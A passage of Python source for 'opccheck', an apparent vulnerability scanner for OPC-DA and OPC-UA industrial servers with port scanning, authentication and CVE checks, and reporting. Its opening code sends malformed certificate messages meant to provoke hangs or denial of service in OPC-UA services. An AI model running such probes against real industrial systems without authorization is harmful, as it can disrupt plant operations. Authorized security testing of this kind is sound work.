                    message = b"OPN" + b"F"
                    message += struct.pack("<I", 8 + len(body))
                    message += body

                    start_time = time.time()
                    sock.send(message)

                    try:
                        cert_response = sock.recv(4096)
                        elapsed = time.time() - start_time

                        if elapsed > 2.0:
                            evidence.append(f"{test_name}: Slow response ({elapsed:.1f}s) - potential processing issue")
                            vulnerable = True
                            confidence = "MEDIUM"
                            poc_output.append(f"POC WARNING: {test_name} caused delayed response")
                        elif cert_response:
                            if cert_response[0:3] == b"ERR":
                                evidence.append(f"{test_name}: Rejected quickly (good)")
                            else:
                                evidence.append(f"{test_name}: Unexpected response type")

                    except socket.timeout:
                        elapsed = time.time() - start_time
                        evidence.append(f"{test_name}: Server timed out after {elapsed:.1f}s (potential infinite loop)")
                        vulnerable = True
                        confidence = "HIGH"
                        poc_output.append(f"POC ALERT: {test_name} may have triggered infinite loop")

                    sock.close()

                except socket.timeout:
                    evidence.append(f"{test_name}: Connection timeout")
                    vulnerable = True
                    confidence = "MEDIUM"
                except Exception as e:
                    evidence.append(f"{test_name}: Error - {str(e)}")

                time.sleep(0.3)  # Pause between tests

            # Test 3: Verify service recovery
            poc_output.append("POC Step 3: Verifying service recovery")

            try:
                sock = self._create_socket()
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))
                sock.send(hello)
                final_response = sock.recv(4096)
                sock.close()

                if final_response:
                    evidence.append("Service recovered after certificate tests")
                    poc_output.append("POC: Service responding normally after tests")
                else:
                    evidence.append("Service degraded after certificate tests")
                    if vulnerable:
                        confidence = "HIGH"

            except Exception as e:
                evidence.append(f"Service not responding after tests: {str(e)}")
                vulnerable = True
                confidence = "HIGH"

        except socket.timeout:
            evidence.append("Initial connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def run_all_checks(self) -> List[CVECheckResult]:
        """Run all OPC-UA CVE checks"""
        self.results = []
        self.check_cve_2024_42513()
        self.check_cve_2024_45526()
        self.check_cve_2024_33862()
        self.check_cve_2019_19135()
        self.check_cve_2018_7559()
        self.check_cve_2022_37012()
        self.check_cve_2022_37013()
        return self.results


# =============================================================================
# Security Assessment
# =============================================================================

class OPCSecurityAssessor:
    """Performs comprehensive security assessment of OPC-DA and OPC-UA servers"""

    def __init__(self, target: str, timeout: float = 5.0, verbose: bool = False):
        self.target = target
        self.timeout = timeout
        self.verbose = verbose
        self.dcom = DCOMChecker(target, timeout, verbose)
        self.opcda = OPCDAChecker(self.dcom)
        self.activation = RemoteActivationChecker(self.dcom)
        self.opcda_cve = OPCDACVEChecker(self.dcom, verbose)
        self.opcua_cve = OPCUACVEChecker(target, timeout, verbose)
        self.results: List[SecurityCheckResult] = []
        self.cve_results: List[CVECheckResult] = []

    def _log(self, message: str):
        """Log verbose output"""
        if self.verbose:
            print(f"[*] {message}")

    def _add_result(self, check_name: str, passed: bool, severity: str,
                    message: str, details: Dict = None):
        """Add a security check result"""
        self.results.append(SecurityCheckResult(
            check_name=check_name,
            passed=passed,
            severity=severity,
            message=message,
            details=details or {}
        ))

    def check_dcom_ports(self, scan_range: bool = False) -> List[PortScanResult]:
        """Check for accessible DCOM ports"""
        self._log("Scanning for DCOM ports...")

        port_results = self.dcom.scan_dynamic_ports(common_only=not scan_range)

        open_ports = [r for r in port_results if r.is_open]
        dcom_ports = [r for r in port_results if r.is_dcom]

        if dcom_ports:
            self._add_result(
                "DCOM Port Accessibility",
                False,
                "HIGH",
                f"Found {len(dcom_ports)} accessible DCOM port(s)",
                {"ports": [r.port for r in dcom_ports]}
            )
        elif open_ports:
            self._add_result(
                "DCOM Port Accessibility",
                True,
                "INFO",
                f"Found {len(open_ports)} open port(s), but no DCOM services detected",
                {"ports": [r.port for r in open_ports]}
            )
        else:
            self._add_result(
                "DCOM Port Accessibility",
                True,
                "INFO",
                "No accessible DCOM ports found",
                {}
            )

        return port_results

    def check_endpoint_mapper(self) -> bool:
        """Check RPC Endpoint Mapper accessibility"""
        self._log("Checking RPC Endpoint Mapper...")

        accessible, endpoints = self.dcom.check_endpoint_mapper()

        if accessible:
            self._add_result(
                "RPC Endpoint Mapper",
                False,
                "MEDIUM",
                "RPC Endpoint Mapper (port 135) is accessible from remote host",
                {"accessible": True}
            )
        else:
            self._add_result(
                "RPC Endpoint Mapper",
                True,
                "INFO",
                "RPC Endpoint Mapper is not accessible",
                {"accessible": False}
            )

        return accessible

    def check_authentication(self) -> AuthCheckResult:
        """Check authentication requirements"""
        self._log("Checking authentication requirements...")

        auth_result = self.opcda.check_unauthenticated_access()

        if auth_result.anonymous_allowed:
            self._add_result(
                "OPC-DA Authentication",
                False,
                "CRITICAL",
                "OPC-DA server allows unauthenticated/anonymous access",
                {
                    "anonymous_allowed": True,
                    "auth_level": auth_result.auth_level
                }
            )
        elif auth_result.error and "refused" not in auth_result.error.lower():
            self._add_result(
                "OPC-DA Authentication",
                True,
                "INFO",
                "Authentication check inconclusive - connection issues",
                {"error": auth_result.error}
            )
        else:
            self._add_result(
                "OPC-DA Authentication",
                True,
                "INFO",
                "OPC-DA server appears to require authentication",
                {"requires_auth": auth_result.requires_auth}
            )

        return auth_result

    def check_browsing(self) -> BrowseCheckResult:
        """Check OPC item browsing capability"""
        self._log("Checking OPC item browsing capability...")

        browse_result = self.opcda.check_browsing_capability()

        if browse_result.can_browse:
            self._add_result(
                "OPC Item Browsing",
                False,
                "HIGH",
                "OPC item browsing interface is accessible",
                {"can_browse": True}
            )
        else:
            self._add_result(
                "OPC Item Browsing",
                True,
                "INFO",
                "OPC item browsing interface is not accessible",
                {"error": browse_result.error}
            )

        return browse_result

    def check_remote_activation(self) -> Tuple[bool, bool]:
        """Check DCOM remote activation"""
        self._log("Checking DCOM remote activation...")

        oxid_accessible, oxid_error = self.activation.check_remote_activation()
        irem_accessible, irem_error = self.activation.check_iremunknown()

        if oxid_accessible:
            self._add_result(
                "DCOM Remote Activation",
                False,
                "HIGH",
                "DCOM remote activation (OXID Resolver) is enabled and accessible",
                {"oxid_accessible": True}
            )
        else:
            self._add_result(
                "DCOM Remote Activation",
                True,
                "INFO",
                "DCOM remote activation appears to be restricted",
                {"oxid_accessible": False, "error": oxid_error}
            )

        if irem_accessible:
            self._add_result(
                "IRemUnknown Interface",
                False,
                "MEDIUM",
                "IRemUnknown2 interface is accessible (allows remote COM object manipulation)",
                {"accessible": True}
            )

        return oxid_accessible, irem_accessible

    def check_opc_server_list(self) -> bool:
        """Check IOPCServerList accessibility"""
        self._log("Checking OPC Server List interface...")

        accessible, error = self.opcda.check_opc_server_list()

        if accessible:
            self._add_result(
                "OPC Server Enumeration",
                False,
                "MEDIUM",
                "IOPCServerList interface is accessible (allows enumerating OPC servers)",
                {"accessible": True}
            )
        else:
            self._add_result(
                "OPC Server Enumeration",
                True,
                "INFO",
                "IOPCServerList interface is not accessible",
                {"error": error}
            )

        return accessible

    def check_opcda_cves(self) -> List[CVECheckResult]:
        """Run OPC-DA specific CVE vulnerability checks"""
        self._log("Running OPC-DA CVE vulnerability checks...")

        results = self.opcda_cve.run_all_checks()

        for result in results:
            cve_info = CVE_DATABASE.get(result.cve_id, {})
            if result.vulnerable:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    False,
                    result.severity,
                    f"{cve_info.get('name', 'Unknown')}: POTENTIALLY VULNERABLE ({result.confidence} confidence)",
                    {
                        "cve_id": result.cve_id,
                        "confidence": result.confidence,
                        "evidence": result.evidence,
                        "remediation": result.remediation
                    }
                )
            else:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    True,
                    "INFO",
                    f"{cve_info.get('name', 'Unknown')}: Not vulnerable or not applicable",
                    {
                        "cve_id": result.cve_id,
                        "evidence": result.evidence
                    }
                )

        self.cve_results.extend(results)
        return results

    def check_opcua_cves(self) -> List[CVECheckResult]:
        """Run OPC-UA specific CVE vulnerability checks"""
        self._log("Running OPC-UA CVE vulnerability checks...")

        results = self.opcua_cve.run_all_checks()

        for result in results:
            cve_info = CVE_DATABASE.get(result.cve_id, {})
            if result.vulnerable:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    False,
                    result.severity,
                    f"{cve_info.get('name', 'Unknown')}: POTENTIALLY VULNERABLE ({result.confidence} confidence)",
                    {
                        "cve_id": result.cve_id,
                        "confidence": result.confidence,
                        "evidence": result.evidence,
                        "remediation": result.remediation
                    }
                )
            else:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    True,
                    "INFO",
                    f"{cve_info.get('name', 'Unknown')}: Not vulnerable or not applicable",
                    {
                        "cve_id": result.cve_id,
                        "evidence": result.evidence
                    }
                )

        self.cve_results.extend(results)
        return results

    def check_specific_cve(self, cve_id: str) -> Optional[CVECheckResult]:
        """Check for a specific CVE vulnerability"""
        cve_id = cve_id.upper()

        if cve_id not in CVE_DATABASE:
            self._log(f"Unknown CVE: {cve_id}")
            return None

        cve_info = CVE_DATABASE[cve_id]
        protocol = cve_info.get("protocol", "")

        self._log(f"Checking {cve_id}: {cve_info.get('name', 'Unknown')}")

        result = None

        if protocol == "OPC-DA":
            checker = self.opcda_cve
            if cve_id == "CVE-2021-26414":
                result = checker.check_cve_2021_26414()
            elif cve_id == "CVE-2018-1285":
                result = checker.check_cve_2018_1285()
            elif cve_id == "CVE-2006-0743":
                result = checker.check_cve_2006_0743()
        elif protocol == "OPC-UA":
            checker = self.opcua_cve
            if cve_id == "CVE-2024-42513":
                result = checker.check_cve_2024_42513()
            elif cve_id == "CVE-2024-45526":
                result = checker.check_cve_2024_45526()
            elif cve_id == "CVE-2024-33862":
                result = checker.check_cve_2024_33862()
            elif cve_id == "CVE-2019-19135":
                result = checker.check_cve_2019_19135()
            elif cve_id == "CVE-2018-7559":
                result = checker.check_cve_2018_7559()
            elif cve_id == "CVE-2022-37012":
                result = checker.check_cve_2022_37012()
            elif cve_id == "CVE-2022-37013":
                result = checker.check_cve_2022_37013()

        if result:
            self.cve_results.append(result)
            if result.vulnerable:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    False,
                    result.severity,
                    f"{cve_info.get('name', 'Unknown')}: POTENTIALLY VULNERABLE ({result.confidence} confidence)",
                    {
                        "cve_id": result.cve_id,
                        "confidence": result.confidence,
                        "evidence": result.evidence,
                        "remediation": result.remediation
                    }
                )
            else:
                self._add_result(
                    f"CVE Check: {result.cve_id}",
                    True,
                    "INFO",
                    f"{cve_info.get('name', 'Unknown')}: Not vulnerable or not applicable",
                    {
                        "cve_id": result.cve_id,
                        "evidence": result.evidence
                    }
                )

        return result

    def run_all_checks(self, scan_ports: bool = True,
                       scan_range: bool = False,
                       check_cves: bool = True,
                       check_opcda_cves: bool = True,
                       check_opcua_cves: bool = True) -> List[SecurityCheckResult]:
        """Run all security checks including CVE vulnerability checks"""
        print(f"\n{'='*60}")
        print(f"OPC Security Assessment for: {self.target}")
        print(f"Resolved IP: {self.dcom.resolved_ip}")
        print(f"{'='*60}\n")

        # Port scanning
        if scan_ports:
            print("[+] Checking DCOM port accessibility...")
            self.check_dcom_ports(scan_range)
            print()

        # Endpoint mapper
        print("[+] Checking RPC Endpoint Mapper...")
        self.check_endpoint_mapper()
        print()

        # Authentication
        print("[+] Checking authentication requirements...")
        self.check_authentication()
        print()

        # Browsing
        print("[+] Checking OPC item browsing...")
        self.check_browsing()
        print()

        # Remote activation
        print("[+] Checking DCOM remote activation...")
        self.check_remote_activation()
        print()

        # Server enumeration
        print("[+] Checking OPC server enumeration...")
        self.check_opc_server_list()
        print()

        # CVE vulnerability checks
        if check_cves:
            print(f"{'='*60}")
            print("CVE VULNERABILITY CHECKS")
            print(f"{'='*60}\n")

            if check_opcda_cves:
                print("[+] Running OPC-DA CVE checks...")
                print("    - CVE-2021-26414: DCOM Security Hardening Bypass")
                print("    - CVE-2018-1285: AADvance OPC-DA log4net Vulnerability")
                print("    - CVE-2006-0743: Format String Vulnerability")
                self.check_opcda_cves()
                print()

            if check_opcua_cves:
                print("[+] Running OPC-UA CVE checks...")
                print("    - CVE-2024-42513: HTTPS Authentication Bypass")
                print("    - CVE-2024-45526: Resource Exhaustion")
                print("    - CVE-2024-33862: Buffer Management DoS")
                print("    - CVE-2019-19135: Weak Randomness")
                print("    - CVE-2018-7559: Private Key Exposure")
                print("    - CVE-2022-37012: DoS via Crafted Messages")
                print("    - CVE-2022-37013: DoS via Crafted Certificates")
                self.check_opcua_cves()
                print()

        return self.results

    def print_summary(self):
        """Print a summary of all security check results"""
        print(f"\n{'='*60}")
        print("SECURITY ASSESSMENT SUMMARY")
        print(f"{'='*60}\n")

        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_results = sorted(self.results, key=lambda r: severity_order.get(r.severity, 5))

        critical_count = sum(1 for r in self.results if r.severity == "CRITICAL" and not r.passed)
        high_count = sum(1 for r in self.results if r.severity == "HIGH" and not r.passed)
        medium_count = sum(1 for r in self.results if r.severity == "MEDIUM" and not r.passed)

        # Separate CVE results from general results
        cve_results = [r for r in sorted_results if r.check_name.startswith("CVE Check:")]
        general_results = [r for r in sorted_results if not r.check_name.startswith("CVE Check:")]

        # Print general security findings first
        if general_results:
            print("GENERAL SECURITY FINDINGS:")
            print("-" * 40)
            for result in general_results:
                status = "PASS" if result.passed else "FAIL"
                status_char = "[+]" if result.passed else "[-]"
                print(f"{status_char} [{result.severity}] {result.check_name}: {status}")
                print(f"    {result.message}")
                if result.details and self.verbose:
                    for key, value in result.details.items():
                        if key not in ["evidence", "remediation"]:  # These are shown separately for CVEs
                            print(f"      - {key}: {value}")
                print()

        # Print CVE findings
        if cve_results:
            print(f"\n{'='*60}")
            print("CVE VULNERABILITY FINDINGS:")
            print("-" * 40)

            vulnerable_cves = [r for r in cve_results if not r.passed]
            safe_cves = [r for r in cve_results if r.passed]

            if vulnerable_cves:
                print("\nPOTENTIALLY VULNERABLE:")
                for result in vulnerable_cves:
                    cve_id = result.details.get("cve_id", "Unknown")
                    confidence = result.details.get("confidence", "Unknown")
                    print(f"  [-] [{result.severity}] {cve_id}")
                    print(f"      {result.message}")
                    print(f"      Confidence: {confidence}")

                    if self.verbose:
                        evidence = result.details.get("evidence", [])
                        if evidence:
                            print("      Evidence:")
                            for e in evidence[:5]:  # Limit to first 5 evidence items
                                print(f"        - {e}")

                        remediation = result.details.get("remediation")
                        if remediation:
                            print(f"      Remediation: {remediation}")
                    print()

            if safe_cves and self.verbose:
                print("\nNOT VULNERABLE (or not applicable):")
                for result in safe_cves:
                    cve_id = result.details.get("cve_id", "Unknown")
                    print(f"  [+] {cve_id}: {result.message}")

        print(f"\n{'='*60}")
        print(f"FINDINGS: {critical_count} Critical, {high_count} High, {medium_count} Medium")

        # CVE-specific summary
        if self.cve_results:
            vuln_cves = sum(1 for r in self.cve_results if r.vulnerable)
            high_conf_cves = sum(1 for r in self.cve_results if r.vulnerable and r.confidence == "HIGH")
            print(f"CVE VULNERABILITIES: {vuln_cves} potentially vulnerable ({high_conf_cves} high confidence)")

        if critical_count > 0:
            print("\n[!] CRITICAL issues found - immediate action recommended!")
        elif high_count > 0:
            print("\n[!] HIGH severity issues found - remediation recommended.")

        print(f"{'='*60}\n")

        return critical_count, high_count, medium_count

    def print_cve_details(self):
        """Print detailed CVE vulnerability information with POC output"""
        if not self.cve_results:
            print("No CVE checks have been performed.")
            return

        print(f"\n{'='*60}")
        print("DETAILED CVE VULNERABILITY REPORT")
        print(f"{'='*60}\n")

        for result in self.cve_results:
            cve_info = CVE_DATABASE.get(result.cve_id, {})

            vuln_status = "POTENTIALLY VULNERABLE" if result.vulnerable else "NOT VULNERABLE"
            status_marker = "[-]" if result.vulnerable else "[+]"

            print(f"{status_marker} {result.cve_id}: {cve_info.get('name', 'Unknown')}")
            print(f"    Status: {vuln_status}")
            print(f"    Severity: {result.severity} (CVSS: {cve_info.get('cvss', 'N/A')})")
            print(f"    Confidence: {result.confidence}")
            print(f"    Protocol: {cve_info.get('protocol', 'N/A')}")
            print(f"    CWE: {cve_info.get('cwe', 'N/A')}")
            print()

            print("    Description:")
            print(f"      {cve_info.get('description', 'No description available')}")
            print()

            if result.evidence:
                print("    Evidence:")
                for e in result.evidence:
                    print(f"      - {e}")
                print()

            if result.poc_output:
                print("    POC Output:")
                for line in result.poc_output.split('\n'):
                    print(f"      {line}")
                print()

            if result.remediation:
                print("    Remediation:")
                print(f"      {result.remediation}")
                print()

            print("-" * 60)
            print()


# =============================================================================
# CLI Interface
# =============================================================================

def create_parser() -> argparse.ArgumentParser:
    """Create the argument parser"""
    parser = argparse.ArgumentParser(
        prog="opccheck",
        description="""
OPC Security Checker - A tool for security assessment of OPC-DA and OPC-UA servers.

This tool performs various security checks including:
- DCOM connectivity tests and authentication verification
- OPC-DA browsing capability assessment
- CVE vulnerability detection for both OPC-DA and OPC-UA protocols

Supported CVE checks:
  OPC-DA: CVE-2021-26414, CVE-2018-1285, CVE-2006-0743
  OPC-UA: CVE-2024-42513, CVE-2024-45526, CVE-2024-33862,
          CVE-2019-19135, CVE-2018-7559, CVE-2022-37012, CVE-2022-37013

IMPORTANT: This tool is intended for authorized security testing and
research only. Always obtain proper authorization before testing
systems you do not own.
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.100
      Full security assessment including CVE checks

  %(prog)s opcserver.example.com -v --cve-details
      Verbose check with detailed CVE POC output

  %(prog)s 10.0.0.50 --cve CVE-2021-26414 --cve CVE-2024-42513
      Check specific CVEs only

  %(prog)s 192.168.1.100 --opcda-cves-only
      Only run OPC-DA CVE vulnerability checks

  %(prog)s 192.168.1.100 --opcua-cves-only
      Only run OPC-UA CVE vulnerability checks

  %(prog)s 192.168.1.100 --no-cve-checks
      Skip CVE checks, only run general security assessment

  %(prog)s --list-cves
      List all supported CVE vulnerability checks

  %(prog)s 10.0.0.50 --json -o results.json
      Output results in JSON format to file

Report bugs to: https://github.com/opccheck/opccheck/issues
        """
    )

    # Target argument (optional when using --list-cves)
    parser.add_argument(
        "target",
        metavar="TARGET",
        nargs="?",
        default=None,
        help="Target OPC server (hostname, DNS name, or IP address)"
    )

    # Port scanning options
    port_group = parser.add_argument_group("Port Scanning Options")
    port_group.add_argument(
        "--scan-ports",
        action="store_true",
        default=True,
        dest="scan_ports",
        help="Scan for accessible DCOM ports (default: enabled)"
    )
    port_group.add_argument(
        "--no-port-scan",
        action="store_false",
        dest="scan_ports",
        help="Disable port scanning"
    )
    port_group.add_argument(
        "--port-range",
        metavar="START-END",
        help="Custom port range to scan (e.g., 49152-49200)"
    )
    port_group.add_argument(
        "--common-ports-only",
        action="store_true",
        default=True,
        help="Only scan commonly used DCOM ports (default)"
    )
    port_group.add_argument(
        "-p", "--port",
        type=int,
        metavar="PORT",
        help="Check a specific port only"
    )

    # Security check options
    check_group = parser.add_argument_group("Security Check Options")
    check_group.add_argument(
        "--check-auth",
        action="store_true",
        default=True,
        help="Check authentication requirements (default: enabled)"
    )
    check_group.add_argument(
        "--check-browse",
        action="store_true",
        default=True,
        help="Check OPC item browsing capability (default: enabled)"
    )
    check_group.add_argument(
        "--check-activation",
        action="store_true",
        default=True,
        help="Check DCOM remote activation (default: enabled)"
    )

    # CVE Check options
    cve_group = parser.add_argument_group("CVE Vulnerability Check Options")
    cve_group.add_argument(
        "--check-cves",
        action="store_true",
        default=True,
        dest="check_cves",
        help="Run CVE vulnerability checks (default: enabled)"
    )
    cve_group.add_argument(
        "--no-cve-checks",
        action="store_false",
        dest="check_cves",
        help="Disable CVE vulnerability checks"
    )
    cve_group.add_argument(
        "--opcda-cves-only",
        action="store_true",
        help="Only run OPC-DA CVE checks (skip OPC-UA checks)"
    )
    cve_group.add_argument(
        "--opcua-cves-only",
        action="store_true",
        help="Only run OPC-UA CVE checks (skip OPC-DA checks)"
    )
    cve_group.add_argument(
        "--cve",
        metavar="CVE-ID",
        action="append",
        dest="specific_cves",
        help="Check specific CVE(s) only (can be used multiple times)"
    )
    cve_group.add_argument(
        "--list-cves",
        action="store_true",
        help="List all supported CVE checks and exit"
    )
    cve_group.add_argument(
        "--cve-details",
        action="store_true",
        help="Show detailed CVE information including POC output"
    )

    # Output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    output_group.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Quiet mode - only show findings"
    )
    output_group.add_argument(
        "--json",
        action="store_true",
        help="Output results in JSON format"
    )
    output_group.add_argument(
        "-o", "--output",
        metavar="FILE",
        help="Write results to file"
    )

    # Connection options
    conn_group = parser.add_argument_group("Connection Options")
    conn_group.add_argument(
        "-t", "--timeout",
        type=float,
        default=5.0,
        metavar="SECONDS",
        help="Connection timeout in seconds (default: 5)"
    )

    # General options
    parser.add_argument(
        "-V", "--version",
        action="version",
        version=f"%(prog)s {__version__}"
    )

    return parser


def parse_port_range(port_range_str: str) -> Tuple[int, int]:
    """Parse a port range string like '49152-49200'"""
    try:
        parts = port_range_str.split("-")
        if len(parts) != 2:
            raise ValueError("Invalid format")
        start = int(parts[0])
        end = int(parts[1])
        if start < 1 or end > 65535 or start > end:
            raise ValueError("Invalid port numbers")
        return start, end
    except Exception:
        raise argparse.ArgumentTypeError(
            f"Invalid port range: {port_range_str}. Use format: START-END (e.g., 49152-49200)"
        )


def list_supported_cves():
    """Print a list of all supported CVE checks"""
    print(f"\n{'='*70}")
    print("SUPPORTED CVE VULNERABILITY CHECKS")
    print(f"{'='*70}\n")

    # Group by protocol
    opcda_cves = [(k, v) for k, v in CVE_DATABASE.items() if v.get("protocol") == "OPC-DA"]
    opcua_cves = [(k, v) for k, v in CVE_DATABASE.items() if v.get("protocol") == "OPC-UA"]

    print("OPC-DA VULNERABILITIES:")
    print("-" * 70)
    for cve_id, info in sorted(opcda_cves):
        print(f"  {cve_id}")
        print(f"    Name: {info['name']}")
        print(f"    Severity: {info['severity']} (CVSS: {info['cvss']})")
        print(f"    CWE: {info['cwe']}")
        print(f"    Description: {info['description'][:80]}...")
        print()

    print("\nOPC-UA VULNERABILITIES:")
    print("-" * 70)
    for cve_id, info in sorted(opcua_cves):
        print(f"  {cve_id}")
        print(f"    Name: {info['name']}")
        print(f"    Severity: {info['severity']} (CVSS: {info['cvss']})")
        print(f"    CWE: {info['cwe']}")
        print(f"    Description: {info['description'][:80]}...")
        print()

    print(f"{'='*70}")
    print(f"Total: {len(opcda_cves)} OPC-DA CVEs, {len(opcua_cves)} OPC-UA CVEs")
    print(f"{'='*70}\n")


def output_json(results: List[SecurityCheckResult], target: str,
                cve_results: List[CVECheckResult] = None):
    """Output results in JSON format"""
    import json

    output = {
        "target": target,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "results": [],
        "cve_results": []
    }

    for result in results:
        output["results"].append({
            "check_name": result.check_name,
            "passed": result.passed,
            "severity": result.severity,
            "message": result.message,
            "details": result.details
        })

    if cve_results:
        for result in cve_results:
            cve_info = CVE_DATABASE.get(result.cve_id, {})
            output["cve_results"].append({
                "cve_id": result.cve_id,
                "name": cve_info.get("name", "Unknown"),
                "vulnerable": result.vulnerable,
                "severity": result.severity,
                "confidence": result.confidence,
                "cvss": cve_info.get("cvss"),
                "cwe": cve_info.get("cwe"),
                "protocol": cve_info.get("protocol"),
                "evidence": result.evidence,
                "poc_output": result.poc_output,
                "remediation": result.remediation,
                "details": result.details
            })

    print(json.dumps(output, indent=2))


def main():
    """Main entry point"""
    parser = create_parser()
    args = parser.parse_args()

    # Handle --list-cves option
    if args.list_cves:
        list_supported_cves()
        sys.exit(0)

    # Check that target is provided for all other operations
    if not args.target:
        parser.error("TARGET is required (unless using --list-cves)")

    # Validate arguments
    if args.port_range:
        port_range = parse_port_range(args.port_range)
        scan_range = True
    else:
        port_range = None
        scan_range = False

    # Determine which CVE checks to run
    check_opcda_cves = True
    check_opcua_cves = True

    if args.opcda_cves_only:
        check_opcua_cves = False
    if args.opcua_cves_only:
        check_opcda_cves = False

    try:
        # Create assessor
        assessor = OPCSecurityAssessor(
            target=args.target,
            timeout=args.timeout,
            verbose=args.verbose
        )

        # Run checks
        if args.port:
            # Single port check
            if not args.quiet:
                print(f"Checking port {args.port} on {args.target}...")
            result = assessor.dcom.check_port(args.port)
            print(f"Port {args.port}: {'OPEN' if result.is_open else 'CLOSED'}")
            if result.is_dcom:
                print(f"  DCOM service detected")
            if result.error:
                print(f"  Error: {result.error}")

        elif args.specific_cves:
            # Check specific CVEs only
            print(f"\n{'='*60}")
            print(f"CVE Vulnerability Check for: {args.target}")
            print(f"Resolved IP: {assessor.dcom.resolved_ip}")
            print(f"{'='*60}\n")

            for cve_id in args.specific_cves:
                print(f"[+] Checking {cve_id.upper()}...")
                result = assessor.check_specific_cve(cve_id)
                if result is None:
                    print(f"    ERROR: Unknown CVE: {cve_id}")
                    print(f"    Use --list-cves to see supported CVEs")
                print()

            if args.json:
                output_json(assessor.results, args.target, assessor.cve_results)
            else:
                if args.cve_details:
                    assessor.print_cve_details()
                else:
                    assessor.print_summary()

        else:
            # Full assessment
            results = assessor.run_all_checks(
                scan_ports=args.scan_ports,
                scan_range=scan_range,
                check_cves=args.check_cves,
                check_opcda_cves=check_opcda_cves,
                check_opcua_cves=check_opcua_cves
            )

            if args.json:
                output_json(results, args.target, assessor.cve_results)
            else:
                assessor.print_summary()
                if args.cve_details and assessor.cve_results:
                    assessor.print_cve_details()

            # Write to file if requested
            if args.output:
                import json
                with open(args.output, 'w') as f:
                    output = {
                        "target": args.target,
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        "results": [],
                        "cve_results": []
                    }
                    for result in results:
                        output["results"].append({
                            "check_name": result.check_name,
                            "passed": result.passed,
                            "severity": result.severity,
                            "message": result.message,
                            "details": result.details
                        })
                    for cve_result in assessor.cve_results:
                        cve_info = CVE_DATABASE.get(cve_result.cve_id, {})
                        output["cve_results"].append({
                            "cve_id": cve_result.cve_id,
                            "name": cve_info.get("name", "Unknown"),
                            "vulnerable": cve_result.vulnerable,
                            "severity": cve_result.severity,
                            "confidence": cve_result.confidence,
                            "cvss": cve_info.get("cvss"),
                            "evidence": cve_result.evidence,
                            "poc_output": cve_result.poc_output,
                            "remediation": cve_result.remediation
                        })
                    json.dump(output, f, indent=2)
                print(f"Results written to: {args.output}")

            # Exit with appropriate code
            critical, high, _ = assessor.print_summary() if not args.json else (0, 0, 0)
            if critical > 0:
                sys.exit(2)
            elif high > 0:
                sys.exit(1)

    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
